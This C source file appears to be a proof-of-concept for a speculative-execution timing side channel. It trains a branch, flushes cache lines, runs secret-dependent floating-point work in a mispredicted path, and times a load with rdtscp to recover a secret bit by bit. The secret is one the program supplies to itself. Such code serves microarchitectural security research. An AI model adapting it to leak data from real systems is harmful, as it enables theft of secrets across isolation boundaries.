#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>
#include <xmmintrin.h>

#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 1024
#define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
#define CLFLUSH(a) \
{ \
      asm volatile ("clflush 0(%0)": : "r" (&a):); \
}

uint64_t global_variable = 0xf;
uint64_t tmp;
unsigned int dummy;
uint64_t start, end;
double value;
static uint8_t array[SIZE * STRIDE] __attribute__((aligned(512)));
uint64_t fast, slow;


double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
{
  for (volatile int i = 0; i < 200; i++);
  BARRIER

  if (isPublic < array[0x2 * STRIDE]) {
    uint64_t tmp = ((secret >> bit) & 1) ? 0x40f0000000000000 : 0x0010deadbeef1337;
    volatile double tmp2 = tmp * tmp;
    
    asm volatile (".rept 47;\nsqrtsd %xmm0, %xmm0;\nmulsd %xmm0, %xmm0;\n.endr");
    *(volatile uint64_t*)&global_variable;
  }
  return 0;
}


int main(int argc, char *argv[])
{
  volatile double tmp_value1, tmp_value, tmp_value2;

  int secret = atoi(argv[1]);
  int guess = 0;

  BARRIER

  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;
  
  BARRIER
  uint64_t result[8] = {0};

  for (volatile int i = 0; i < 8; i++) {
    tmp_value1 = victim_function(0,0,0);
    tmp_value2 = victim_function(0,0,0);

    BARRIER
    CLFLUSH(array[0x2 * STRIDE]);
    CLFLUSH(global_variable);
    BARRIER

    tmp_value = victim_function(secret, i, 100);

    BARRIER
    start = __rdtscp(&dummy);
    *(volatile uint8_t*)&global_variable;
    end = __rdtscp(&dummy) - start;
    BARRIER

    int tmp = end > 60 ? 0 : 1;
    result[i] = end;
    guess = guess | (tmp << i);
    BARRIER
    asm volatile (".rept 4096;\nnop;\n.endr");
  }
  BARRIER
  for (int i = 0; i < 8; i++)
    printf("%3ld ", result[i]);
  printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);
}
